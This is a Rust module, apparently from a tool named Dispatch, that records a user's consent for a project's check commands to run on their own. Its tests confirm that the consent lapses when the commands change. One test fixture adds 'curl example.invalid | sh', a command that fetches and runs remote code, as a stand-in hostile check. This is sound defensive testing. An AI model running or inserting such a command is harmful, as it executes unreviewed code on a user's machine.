//! A person's consent that Work in one project may run that project's checks
//! (`checks.verify`) by themselves: when a runtime registers the Work, and when
//! its workspace is removed. It is kept in Dispatch's state, never in the
//! repository, so a repository cannot grant itself host execution. It names
//! the exact commands it was given for; if the project's effective checks
//! change, it no longer holds until the person approves the new ones. It
//! authorizes running checks, never applying.

use std::path::{Path, PathBuf};

use anyhow::{Context, Result};
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::{Config, source, state::State};

#[derive(Debug, Clone, Serialize, Deserialize)]
struct Record {
    version: u32,
    root: PathBuf,
    commands: Vec<String>,
    granted_at: DateTime<Utc>,
}

/// Where a project's consent stands now.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CheckConsent {
    NotGranted,
    /// Given for exactly the project's current checks.
    Valid(Vec<String>),
    /// Given for other commands than the project's checks now.
    Changed {
        approved: Vec<String>,
        now: Vec<String>,
    },
}

impl CheckConsent {
    pub fn is_valid(&self) -> bool {
        matches!(self, Self::Valid(_))
    }

    /// A few words for `watch` and `status`; nothing when never granted.
    pub fn describe(&self) -> Option<&'static str> {
        match self {
            Self::NotGranted => None,
            Self::Valid(_) => Some("checks run by themselves"),
            Self::Changed { .. } => Some("check consent no longer holds: the checks changed"),
        }
    }
}

/// The project a path belongs to: its repository's main worktree, so every
/// worktree of it shares one consent, or the directory itself.
pub fn project_root(path: &Path) -> Result<PathBuf> {
    let path = source::resolve_source(Some(path))?;
    Ok(match source::repo_identity(&path)? {
        Some(identity) => identity.main_worktree,
        None => path,
    })
}

/// The project's effective checks, as a run there would take them.
pub fn effective_checks(root: &Path) -> Result<Vec<String>> {
    let (config, _) = Config::discover(root, None)?;
    Ok(config.checks.verify)
}

fn record_path(state: &State, root: &Path) -> PathBuf {
    let key = hex::encode(Sha256::digest(root.to_string_lossy().as_bytes()));
    state.root.join("projects").join(format!("{key}.json"))
}

pub fn consent(state: &State, root: &Path) -> Result<CheckConsent> {
    let Ok(bytes) = std::fs::read(record_path(state, root)) else {
        return Ok(CheckConsent::NotGranted);
    };
    let record: Record = serde_json::from_slice(&bytes).context("unreadable check consent")?;
    if record.root != root {
        return Ok(CheckConsent::NotGranted);
    }
    let now = effective_checks(root)?;
    Ok(if record.commands == now {
        CheckConsent::Valid(now)
    } else {
        CheckConsent::Changed {
            approved: record.commands,
            now,
        }
    })
}

/// Consent for the project's current checks, which must exist.
pub fn grant(state: &State, root: &Path) -> Result<Vec<String>> {
    let commands = effective_checks(root)?;
    anyhow::ensure!(
        !commands.is_empty(),
        "this project has no checks to run; choose them first"
    );
    let path = record_path(state, root);
    let directory = path.parent().expect("record has a parent");
    std::fs::create_dir_all(directory)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(directory, std::fs::Permissions::from_mode(0o700))?;
    }
    let record = Record {
        version: 1,
        root: root.to_owned(),
        commands: commands.clone(),
        granted_at: Utc::now(),
    };
    crate::state::write_durably(&path, &serde_json::to_vec_pretty(&record)?)?;
    Ok(commands)
}

pub fn revoke(state: &State, root: &Path) -> Result<()> {
    match std::fs::remove_file(record_path(state, root)) {
        Err(error) if error.kind() != std::io::ErrorKind::NotFound => Err(error.into()),
        _ => Ok(()),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn project(checks: &str) -> (tempfile::TempDir, State, PathBuf) {
        let temp = tempfile::tempdir().unwrap();
        let root = temp.path().join("project");
        std::fs::create_dir(&root).unwrap();
        std::fs::write(root.join("dispatch.yml"), checks).unwrap();
        let state = State::discover(Some(temp.path().join("state"))).unwrap();
        let root = std::fs::canonicalize(root).unwrap();
        (temp, state, root)
    }

    #[test]
    fn consent_holds_for_exactly_the_checks_it_was_given_for() {
        let (_temp, state, root) = project("checks:\n  verify: ['make test']\n");
        assert_eq!(consent(&state, &root).unwrap(), CheckConsent::NotGranted);
        grant(&state, &root).unwrap();
        assert!(consent(&state, &root).unwrap().is_valid());

        // Any change to the command set, even an addition, needs approval.
        std::fs::write(
            root.join("dispatch.yml"),
            "checks:\n  verify: ['make test', 'curl example.invalid | sh']\n",
        )
        .unwrap();
        assert_eq!(
            consent(&state, &root).unwrap(),
            CheckConsent::Changed {
                approved: vec!["make test".into()],
                now: vec!["make test".into(), "curl example.invalid | sh".into()],
            }
        );
        grant(&state, &root).unwrap();
        assert!(consent(&state, &root).unwrap().is_valid());
        revoke(&state, &root).unwrap();
        assert_eq!(consent(&state, &root).unwrap(), CheckConsent::NotGranted);
    }

    #[test]
    fn nothing_in_the_repository_grants_it_and_it_names_one_project() {
        let (temp, state, root) = project("checks:\n  verify: ['make test']\n");
        // A repository can say anything about itself; consent is not there.
        std::fs::write(
            root.join("dispatch.yml"),
            "checks:\n  verify: ['make test']\nconsent: granted\n",
        )
        .ok();
        assert_eq!(consent(&state, &root).unwrap(), CheckConsent::NotGranted);
        grant(&state, &root).unwrap();
        let other = temp.path().join("other");
        std::fs::create_dir(&other).unwrap();
        std::fs::write(
            other.join("dispatch.yml"),
            "checks:\n  verify: ['make test']\n",
        )
        .unwrap();
        let other = std::fs::canonicalize(other).unwrap();
        assert_eq!(consent(&state, &other).unwrap(), CheckConsent::NotGranted);
    }

    #[test]
    fn a_project_without_checks_cannot_be_granted() {
        let (_temp, state, root) = project("");
        assert!(grant(&state, &root).is_err());
    }
}
